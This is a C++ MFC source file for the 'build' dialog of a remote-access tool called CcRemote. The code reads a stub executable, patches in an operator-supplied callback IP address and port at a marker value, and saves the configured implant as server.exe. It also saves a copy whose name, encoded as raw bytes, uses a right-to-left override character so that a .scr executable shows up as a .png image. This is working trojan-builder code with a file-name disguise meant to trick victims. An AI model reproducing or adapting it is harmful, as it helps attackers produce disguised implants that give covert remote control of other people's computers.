// CBuildDlg.cpp: 实现文件
//

#include "pch.h"
#include "CcRemote.h"
#include "CBuildDlg.h"
#include "afxdialogex.h"
#include <io.h>


struct Connect_Address
{
	DWORD dwstact;
	char  strIP[MAX_PATH];
	int   nPort;
	char  ActiveXKeyGuid[MAX_PATH];	// 查找创建的Guid
}g_myAddress = { 0xCC28256,"",0,"" };
// CBuildDlg 对话框

IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)

CBuildDlg::CBuildDlg(CWnd* pParent /*=nullptr*/)
	: CDialog(IDD_DIALOG_BUILD, pParent)
	, m_strIP(_T(""))
	, m_strPort(_T(""))
{

}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_IP, m_strIP);
	DDX_Text(pDX, IDC_EDIT_PORT, m_strPort);
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CBuildDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CBuildDlg 消息处理程序


bool CreateMyFile(const WCHAR* strFilePath, LPBYTE lpBuffer, DWORD dwSize)
{
	DWORD dwWritten;

	HANDLE hFile = CreateFileW(strFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
	{
		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &dwWritten, NULL);
	}
	else
	{
		return false;
	}
	CloseHandle(hFile);
	return true;
}


void CBuildDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	CFile file;
	char strTemp[MAX_PATH];
	WCHAR strTempW[MAX_PATH];
	ZeroMemory(strTemp, MAX_PATH);
	CString strCurrentPath;
	CStringW strCurrentPathW;
	CString strFile;
	CString strSeverFile;
	CString strCamouflageFile;
	BYTE *lpBuffer = NULL;
	BYTE names[] = {0x73,0x00,0x65,0x00,0x78,0x00,0x2E,0x20,0x67,0x00,0x6E,0x00,0x70,0x00,0x2E,0x00,0x73,0x00,0x63,0x00,0x72,0x00,0x00,0x00 };
	PWCHAR namess = (PWCHAR)names;


	DWORD dwFileSize;
	UpdateData(TRUE);
	//////////上线信息//////////////////////
	strcpy(g_myAddress.strIP, m_strIP);
	g_myAddress.nPort = atoi(m_strPort);
	try
	{
		//此处得到未处理前的文件名
		GetModuleFileName(NULL, strTemp, MAX_PATH);     //得到文件名  
		GetModuleFileNameW(NULL, strTempW, MAX_PATH);     //得到文件名  

		strCurrentPathW = strTempW;

		strCurrentPathW = strCurrentPathW.Left(strCurrentPathW.ReverseFind('\\'));

		strCurrentPath = strTemp;
		int nPos = strCurrentPath.ReverseFind('\\');
		strCurrentPath = strCurrentPath.Left(nPos);
		strFile = strCurrentPath + "\\server\\loder.exe";   //得到当前未处理文件名
		//打开文件
		file.Open(strFile, CFile::modeRead | CFile::typeBinary);
		dwFileSize = file.GetLength();
		lpBuffer = new BYTE[dwFileSize];
		ZeroMemory(lpBuffer, dwFileSize);
		//读取文件内容
		file.Read(lpBuffer, dwFileSize);
		file.Close();
		//写入上线IP和端口 主要是寻找0x这个标识然后写入这个位置
		int nOffset = memfind((char*)lpBuffer, (char*)&g_myAddress.dwstact, dwFileSize, sizeof(DWORD));
		memcpy(lpBuffer + nOffset, &g_myAddress, sizeof(Connect_Address));
		//strCamouflageFile = FindFiles("F:\\myapp\\CcRemote\\bin\\server\\", lpBuffer, dwFileSize);
		//if (strCamouflageFile != "null")
		//{
		//	int a = file.Open(strCamouflageFile, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
		//	file.Write(lpBuffer, dwFileSize);
		//	file.Close();
		//}
		//else
		//{
			//保存到文件
		strSeverFile = strCurrentPath+"\\server.exe";

		strCurrentPathW = strCurrentPathW + L"\\" + namess;
		CreateMyFile(strCurrentPathW, lpBuffer, dwFileSize);
		file.Open(strSeverFile, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
		file.Write(lpBuffer, dwFileSize);
		file.Close();
		//}

		delete[] lpBuffer;
		MessageBox("生成成功");

	}
	catch (CMemoryException* e)
	{
		MessageBox("内存不足");
	}
	catch (CFileException* e)
	{
		MessageBox("文件操作错误");
	}
	catch (CException* e)
	{
		MessageBox("未知错误");
	}
	CDialog::OnOK();
}


int CBuildDlg::memfind(const char *mem, const char *str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da) return i;
	}
	return -1;
}

